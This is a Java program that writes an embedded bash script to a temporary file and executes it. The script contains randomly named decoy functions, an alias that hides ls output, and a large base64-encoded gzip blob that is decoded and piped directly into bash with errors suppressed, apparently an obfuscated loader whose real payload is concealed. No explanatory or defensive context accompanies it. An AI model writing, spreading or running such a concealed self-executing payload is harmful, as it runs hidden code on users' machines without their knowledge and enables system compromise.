import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {

            String script = """
#!/bin/bash

v5bidr5of() { echo $((RANDOM * RANDOM)); }
v9q4lgt4u() { for i in {1..3}; do :; done; }
vsq7bgj62() { alias ls='echo hidden'; }

base64 -d <<'EOF' | gunzip | bash 2>/dev/null
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
EOF
""";


            File file = File.createTempFile("start", ".sh");
            try (FileWriter fw = new FileWriter(file)) {
                fw.write(script);
            }


            file.setExecutable(true);


            ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();


            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
